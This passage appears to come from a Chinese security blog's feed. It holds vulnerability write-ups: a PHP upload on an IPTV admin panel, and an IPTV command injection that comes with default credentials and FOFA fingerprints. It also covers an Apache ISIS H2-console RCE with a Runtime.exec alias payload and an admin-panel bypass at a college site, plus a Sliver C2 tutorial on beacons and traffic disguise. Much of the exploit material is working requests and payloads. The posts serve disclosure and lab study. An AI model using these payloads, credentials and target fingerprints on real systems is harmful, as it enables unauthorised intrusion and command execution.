class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;size&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-number">21</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;1.php&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/octet-stream</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;?php phpinfo();?&gt;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryZzN3aF71HnOAXhI3--</span></span><br></code></pre></div></td></tr></table></figure><p> 并且上传成功后，该代码可被执行。</p><p><img src="/2024/11/13/%E6%99%BA-IPTV%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/wps3.jpg" alt="img"> </p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>智***IPTV后台存在RCE漏洞复现</title>
    <link href="/2024/11/13/%E6%99%BA-IPTV%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/11/13/%E6%99%BA-IPTV%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p>使用以下关键字进行空间测绘检索：</p><p>fofa:body&#x3D;”ZHGXTV”<br>web.icon&#x3D;”b8fe4c2f208ff1dc211f537f0a4db342”</p><p><img src="/2024/11/13/%E6%99%BA-IPTV%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E/image-20241113205926264.png" alt="image-20241113205926264"></p><h1 id="1-后台-RCE"><a href="#1-后台-RCE" class="headerlink" title="1 *后台**RCE*"></a><strong>1</strong> <em><strong>*后台*</strong></em><em><strong>*RCE*</strong></em></h1><p>使用默认口令（弱口令）【admin &#x2F; aA123456】登录系统后，抓包并构造数据包，可执行任意命令</p><figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/network/net/index.php?c=ping&amp;a=main&amp;host=www.qq.com</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>think_var=zh-cn; PHPSESSID=evv9epn5rbek6jdrsr101m5h70; check_httpd_pass=1; LF_TOKEN_HASH=b1f4574474d40a13622847cb1e8a9196; ping=127.0.0.1&amp;&amp;echo `whoami`|<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br> <br></code></pre></div></td></tr></table></figure><p> <img src="/2024/11/13/%E6%99%BA-IPTV%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E/image-20241113210027901.png" alt="image-20241113210027901"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞备份</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache ISIS存在H2数据库未授权访问导致命令执行</title>
    <link href="/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="组件说明"><a href="#组件说明" class="headerlink" title="*组件说明*"></a><em><strong>*组件说明*</strong></em></h2><p>Apache Isis™ 通过为您的 Spring Boot™ 应用程序自动生成 UI 来支持域驱动的应用程序开发<br><a href="https://isis.apache.org/">https://isis.apache.org/</a><br><a href="https://github.com/apache/isis">https://github.com/apache/isis</a></p><h2 id="触发原理"><a href="#触发原理" class="headerlink" title="*触发原理*"></a><em><strong>*触发原理*</strong></em></h2><p>h2数据库未设置访问权限，直接对外开放且sa账户可登录；允许用户远程访问导致执行命令</p><p>配置文件如下所示，默认开启数据库且未对远程登录及用户信息进行校验，使得用户可直接登录 H2-console</p><p><img src="/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20241104215329528.png" alt="image-20241104215329528"></p><p>虽然使用了org.apache.isis.testing.h2console.ui.webmodule.WebModuleH2Console</p><p>做了硬编码的配置属性，但由于配置文件未设置权限，仍可绕过。</p><p><img src="/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20241104215339082.png" alt="image-20241104215339082"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="*漏洞利用*"></a><em><strong>*漏洞利用*</strong></em></h2><p>下载搭建M7版本的simpleapp-jdo,具体命令如下：</p><p>curl <a href="https://codeload.github.com/apache/isis-app-simpleapp/zip/jdo">https://codeload.github.com/apache/isis-app-simpleapp/zip/jdo</a> | jar xv</p><p>由于该项目使用的H2数据库默认SA账户登录且允许用户远程登录，直接访问 ip:8080&#x2F;db，即可绕过权限限制直接登录H2-console数据库页面，下图为登录后账户查询</p><p><img src="/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20241104215349153.png" alt="image-20241104215349153"></p><p><img src="/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20241104215353926.png" alt="image-20241104215353926"></p><p>H2数据库可使用语句调用java执行命令，相关查询路径信息如下所示</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS GET_SYSTEM_PROPERTY <span class="hljs-keyword">FOR</span> &quot;java.lang.System.getProperty&quot;<span class="hljs-operator">*</span><span class="hljs-operator">*</span>;<span class="hljs-operator">*</span><span class="hljs-operator">*</span><br><span class="hljs-keyword">CALL</span> GET_SYSTEM_PROPERTY<span class="hljs-operator">*</span><span class="hljs-operator">*</span>(<span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-string">&#x27;java.class.path&#x27;</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span>);<span class="hljs-operator">*</span><span class="hljs-operator">*</span><br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20241104215402508.png" alt="image-20241104215402508"></p><p>且使用的H2版本符合CVE-2021-42392漏洞利用范围，只需创建别名带入Runtime.getRuntime.exec()函数，亦可直接执行系统命令，如whoami、id等。命令如下所示：</p><p>&#x2F;&#x2F;创建别名</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS SHELLEXEC <span class="hljs-keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); <span class="hljs-keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;; &#125;$$;<br></code></pre></div></td></tr></table></figure><p>&#x2F;&#x2F;调用shell执行命令</p><figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">CALL</span> SHELLEXEC(<span class="hljs-string">&#x27;id&#x27;</span>);<br><span class="hljs-keyword">CALL</span> SHELLEXEC(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/04/Apache-ISIS%E5%AD%98%E5%9C%A8H2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20241104215438565.png" alt="image-20241104215438565"></p><h2 id="修补方式"><a href="#修补方式" class="headerlink" title="*修补方式*"></a><em><strong>*修补方式*</strong></em></h2><p>配置文件关闭 web 访问数据库、不允许远程访问</p><p>console:<br> enabled: false<br> settings:<br>  web-allow-others: false</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>edu-src(1)之某师范学院未授权</title>
    <link href="/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/"/>
    <url>/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<p>​</p><p>url: http:&#x2F;&#x2F;***.edu.cn&#x2F;admin&#x2F;login.html</p><p>**师范学院实验室安全教育和考试系统存在未授权后台访问</p><p><img src="/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241104214215600.png" alt="image-20241104214215600"></p><p>修改返回值，-2改成1，404改成200，防包后成功进入后台，不过没有菜单</p><p><img src="/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241104214245654.png" alt="image-20241104214245654"></p><p><img src="/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241104214254496.png" alt="image-20241104214254496"></p><p>访问查看源代码，存在menu.json 文件，手动访问</p><p> <img src="/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241104214324291.png" alt="image-20241104214324291"></p><p><img src="/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241104214350297.png" alt="image-20241104214350297"></p><p><img src="/2024/11/04/edu-src-1-%E4%B9%8B%E6%9F%90%E5%B8%88%E8%8C%83%E5%AD%A6%E9%99%A2%E6%9C%AA%E6%8E%88%E6%9D%83/image-20241104214420456.png" alt="image-20241104214420456"></p>]]></content>
    
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SliverC2 教程(5)</title>
    <link href="/2024/11/04/SliverC2-%E6%95%99%E7%A8%8B-5/"/>
    <url>/2024/11/04/SliverC2-%E6%95%99%E7%A8%8B-5/</url>
    
    <content type="html"><![CDATA[<p>暂无…..</p>]]></content>
    
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SliverC2 教程(4)</title>
    <link href="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/"/>
    <url>/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/</url>
    
    <content type="html"><![CDATA[<h1 id="关于http和https"><a href="#关于http和https" class="headerlink" title="关于http和https"></a>关于http和https</h1><p>前几篇文章中介绍的通信方式固然是不错的选择，但并非所有环境都允许mtls和wireguard。有时目标与外部的网络连接将被默认限制，只有选定的流量可以从内部网络中流出。在这些情况下，必须使用HTTP和HTTPS协议。</p><h1 id="准备http代理"><a href="#准备http代理" class="headerlink" title="准备http代理"></a>准备http代理</h1><p>实验只允许http代理流量进出，这里选择squid工具实现，这里直接本地搭建了</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">apt-get install squid<br></code></pre></div></td></tr></table></figure><p><img src="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/image-20241104094124985.png" alt="image-20241104094124985"></p><p>配置文件 &#x2F;etc&#x2F;squid&#x2F;squid.conf 然后在文件加入</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">acl labnet src 192.168.122.0/24<br>http_access allow labnet<br><br>dns_nameservers 192.168.122.185<br></code></pre></div></td></tr></table></figure><p>然后启动 systemctl start squid 启动squid，这样就有一个可用的web代理了，接下来测试一下是否正常</p><p>curl -x <a href="http://192.168.80.128:3128/">http://192.168.80.128:3128</a> <a href="https://www.baidu.com/">https://www.baidu.com/</a></p><p><img src="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/image-20241104094900375.png" alt="image-20241104094900375"></p><p>正常回显，然后在受害者机上配置此代理</p><p><img src="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/image-20241104095007136.png" alt="image-20241104095007136"></p><p>防火墙配置</p><ul><li><em>允许 Squid HTTP 代理</em>：允许从任何端口到代理主机上的端口 3128 的传出 TCP 连接。</li><li><em>允许 DNS</em> ：允许从任何端口到代理主机的端口 53 的传出 UDP 连接。</li></ul><p><img src="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/image-20241104095804577.png" alt="image-20241104095804577"></p><p><img src="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/image-20241104095924494.png" alt="image-20241104095924494"></p><p><img src="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/image-20241104095931354.png" alt="image-20241104095931354"></p><p><img src="/2024/11/03/SliverC2-%E6%95%99%E7%A8%8B-4/image-20241104100012805.png" alt="image-20241104100012805"></p><p>DNS同理</p><h1 id="https"><a href="#https" class="headerlink" title="https"></a>https</h1><p>这里因为靶机问题，使用其他大手子的内容</p><p>创建</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">generate beacon --http sliver.labnet.local,sliver.labnet.local?driver=wininet --seconds 5 --jitter 0<br>https<br>http<br></code></pre></div></td></tr></table></figure><p>这里第二个域名中添加了参数<code>driver=wininet</code>，表示使用 [wininet](<a href="https://learn.microsoft.com/en-us/windows/win32/wininet/about-wininet">About WinINet - Win32 apps | Microsoft Learn</a>) 驱动程序进行HTTP通信。</p><h3 id="HTTP-C2-高级选项"><a href="#HTTP-C2-高级选项" class="headerlink" title="HTTP C2 高级选项"></a>HTTP C2 高级选项</h3><ul><li><div class="hljs code-wrapper"><pre><code>- `net-timeout` - 网络超时值，由`time.ParseDuration`解析。- `tls-timeout` - TLS 握手超时值，由`time.ParseDuration`解析。- `poll-timeout` - 轮询超时值，由`time.ParseDuration`解析。- `max-errors` - 失败之前的最大 HTTP 错误数（由`strconv.Atoi`解析的整数）。- `driver` - 手动指定 HTTP 驱动程序（字符串）。在 Windows 上，可以将此值设置为`wininet`以使用`wininet` HTTP 库进行 C2 通信。- `force-http` - 设置为`true`以始终强制使用纯文本 HTTP。- `disable-accept-header` - 设置为`true`以禁用 HTTP 接受请求标头。- `disable-upgrade-header` - 设置为`true`以禁用 HTTP 升级请求标头。- `proxy` - 手动指定 HTTP 代理，该值仅与 Go HTTP 驱动程序一起使用，并且格式应该是 Go HTTP 库接受的格式。您必须使用代理的主机名指定 URI 方案。例如， `?proxy=http://myproxy.corp.com:8080`- `proxy-username` - 指定代理用户名。仅对 Go HTTP 驱动程序有效。- `proxy-password` - 指定代理密码。仅对 Go HTTP 驱动程序有效。- `ask-proxy-creds` - 设置为`true`以询问用户 HTTP 代理凭据。仅当与`wininet` HTTP 驱动程序一起使用时有效。- `host-header` - 用于域前端。<figure class="highlight arduino"><table><tr><td class="gutter hljs"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><br>  在Sliver中，**HTTP驱动程序用于生成基于HTTP协议的beacon**，并与Sliver服务器进行通信。HTTP驱动程序默认实现是纯Go实现的，但在某些情况下，**纯Go实现的HTTP驱动程序可能无法正常工作**，例如在使用某些代理服务器或防火墙时。**此时，Sliver会尝试使用<span class="hljs-string">&quot;wininet&quot;</span>驱动程序，**该驱动程序依赖于本地Windows WinInet API。这个驱动程序通常比纯Go实现的HTTP驱动程序更可靠，因为它使用操作系统提供的底层网络功能，可以更好地处理一些复杂的网络环境。<br><br>执行恶意程序并捕获流量，在第一次的连接中显示<span class="hljs-number">400</span>，这是由于内置的http驱动程序无效导致的。<br><br>![image<span class="hljs-number">-20241104103737297</span>](SliverC2-教程<span class="hljs-number">-4</span>/image<span class="hljs-number">-20241104103737297.</span>png)<br><br>等待一会后，**会捕获到后续的TCP连接数据**，在第<span class="hljs-number">17</span>个TCP流中可以查看到返回状态码<span class="hljs-number">200</span>。表明成功建立了HTTP连接。<br>分析其中的数据包，为数不多可见的字符串就是CONNECT字段，表示与 sliver.labnet.local 建立了连接，其余大部分字段都进行了加密处理，没有过多的信息。<br><br>![image<span class="hljs-number">-20241104103800140</span>](SliverC2-教程<span class="hljs-number">-4</span>/image<span class="hljs-number">-20241104103800140.</span>png)<br><br><span class="hljs-meta"># http</span><br><br></code></pre></div></td></tr></table></figure>jobs --kill 1 #将https kill掉[*] Killing job #1 ...[*] Successfully killed job #1</code></pre></li></ul><p>sliver &gt; jobs<br> ID   Name   Protocol   Port<br>&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br> 2    http   tcp        80</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><br>现在，在windows靶机上运行木马，然后等待连接成功<br><br>在http请求当中，所有都是明文显示的。但是实际上，这些都是经过随机选择的编码方案进行编码，这响应的并不是真正的html代码<br><br>![image-20241104104211189]<span class="hljs-params">(SliverC2-教程-4/image-20241104104211189.png)</span><br><br><span class="hljs-comment"># C2 HTTP 通信配置</span><br><br>C2 http 通信配置文件位于 `<span class="hljs-string">/root/.sliver/configs/http-c2.json</span>`，下面拆分解释下<br>`implant_config` 部分是配置Implant使用HTTP进行通信过程中，交互、轮询使用到的一些文件名、路径等，用于混淆C2流量，欺骗目标主机。<br><br>```shell<br>  <span class="hljs-string">&quot;implant_config&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;user_agent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;chrome_base_version&quot;</span>: 100,  <span class="hljs-comment"># 浏览器版本号</span><br>        <span class="hljs-string">&quot;macos_version&quot;</span>: <span class="hljs-string">&quot;10_15_7&quot;</span>,<br>        <span class="hljs-string">&quot;url_parameters&quot;</span>: null,      <span class="hljs-comment"># 表示HTTP请求中的URL参数，用于传递额外的信息或数据</span><br>        <span class="hljs-string">&quot;headers&quot;</span>: null,             <span class="hljs-comment"># 其他头部信息</span><br>        <span class="hljs-string">&quot;max_files&quot;</span>: 8,              <span class="hljs-comment"># 请求中最大文件数</span><br>        <span class="hljs-string">&quot;min_files&quot;</span>: 2,<br>        <span class="hljs-string">&quot;max_paths&quot;</span>: 8,              <span class="hljs-comment"># 请求中最大路径数</span><br>        <span class="hljs-string">&quot;min_paths&quot;</span>: 2,<br>        <span class="hljs-string">&quot;stager_file_ext&quot;</span>: <span class="hljs-string">&quot;.woff&quot;</span>,  <span class="hljs-comment"># stager文件的扩展名（.woff字体文件扩展名）</span><br>        <span class="hljs-string">&quot;poll_file_ext&quot;</span>: <span class="hljs-string">&quot;.js&quot;</span>,      <span class="hljs-comment"># 使用JavaScript文件进行C2服务器轮询</span><br>        <span class="hljs-string">&quot;poll_files&quot;</span>: [              <span class="hljs-comment"># 指定Sliver轮询C2服务器时要使用的文件</span><br>            <span class="hljs-string">&quot;jquery.min&quot;</span>,<br>            <span class="hljs-string">&quot;app&quot;</span>,<br>            <span class="hljs-string">&quot;email&quot;</span>,<br>            <span class="hljs-string">......</span><br>        ],<br>        <span class="hljs-string">&quot;poll_paths&quot;</span>: [              <span class="hljs-comment"># 指定Sliver轮询C2服务器时要使用的路径</span><br>            <span class="hljs-string">&quot;js&quot;</span>,<br>            <span class="hljs-string">&quot;script&quot;</span>,<br>            <span class="hljs-string">&quot;assets&quot;</span>,<br>            <span class="hljs-string">......</span><br>        ],<br>        <span class="hljs-string">&quot;start_session_file_ext&quot;</span>: <span class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-comment"># 指定Sliver启动会话时使用到的文件扩展名</span><br>        <span class="hljs-string">&quot;session_file_ext&quot;</span>: <span class="hljs-string">&quot;.php&quot;</span>,  <span class="hljs-comment"># 表示会话文件的扩展名</span><br>        <span class="hljs-string">&quot;session_files&quot;</span>: [           <span class="hljs-comment"># 表示Sliver生成会话文件时使用的文件名</span><br>            <span class="hljs-string">&quot;login&quot;</span>,<br>            <span class="hljs-string">&quot;signin&quot;</span>,<br>            <span class="hljs-string">......</span><br>        ],<br>        <span class="hljs-string">&quot;session_paths&quot;</span>: [           <span class="hljs-comment"># 指定会话文件的路径</span><br>            <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-string">&quot;api&quot;</span>,<br>            <span class="hljs-string">......</span><br>        ],<br>        <span class="hljs-string">&quot;close_file_ext&quot;</span>: <span class="hljs-string">&quot;.png&quot;</span>,    <span class="hljs-comment"># 表示关闭会话时使用的文件扩展名</span><br>        <span class="hljs-string">&quot;close_files&quot;</span>: [             <span class="hljs-comment"># 指定Sliver在关闭会话时要使用的文件名</span><br>            <span class="hljs-string">&quot;favicon&quot;</span>,<br>            <span class="hljs-string">......</span><br>        ],<br>        <span class="hljs-string">&quot;close_paths&quot;</span>: [             <span class="hljs-comment"># 指定关闭会话时使用的路径</span><br>            <span class="hljs-string">&quot;static&quot;</span>,<br>            <span class="hljs-string">&quot;www&quot;</span>,<br>            <span class="hljs-string">......</span><br>        ]<br>    &#125;,<br></code></pre></div></td></tr></table></figure><p><code>server_config</code> 这部分就是配置C2服务器上响应包的信息</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">&quot;server_config&quot;: &#123;<br>      &quot;random_version_headers&quot;: false, # 随机生成版本号作为请求头<br>      &quot;headers&quot;: [],                   # 自定义头部<br>      &quot;cookies&quot;: [                     # 自定义cookie列表<br>          &quot;PHPSESSID&quot;,<br>          &quot;SID&quot;,<br>          &quot;SSID&quot;,<br>          &quot;APISID&quot;,<br>          &quot;csrf-state&quot;,<br>          &quot;AWSALBCORS&quot;<br>      ]<br>  &#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SliverC2 教程(3)</title>
    <link href="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/"/>
    <url>/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-3/</url>
    
    <content type="html"><![CDATA[<p>前面两章学习了搭建以及beacon和session二进制创建，还有2协议，mtls和wg</p><p>听说如果位于严密保护中的计算机网络当中的时候，使用这两个，会被阻止，所以，在严格保护的计算机网络当中，sliver额外提供了另外两种协议 http 和 dns 。</p><p>接下来需要搭建 dns 服务器，我还是使用这台kali进行搭建，方便后续操作和电脑负担的降低</p><h1 id="DNS准备"><a href="#DNS准备" class="headerlink" title="DNS准备"></a>DNS准备</h1><p>创建dns服务器，将 <strong>sliver.labnet.local</strong> 解析到服务器的ip，<strong>target.labnet.local</strong> 解析为目标的ip，</p><p>安装 sudo apt update sudo </p><p>apt install bind9 bind9utils bind9-doc，</p><p>编辑配置文件 vim &#x2F;etc&#x2F;bind&#x2F;named.conf.local 加入内容</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">zone &quot;sliver.com&quot; &#123;<br>    type master;<br>    file &quot;/etc/bind/db.sliver.com&quot;;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>创建区域文件 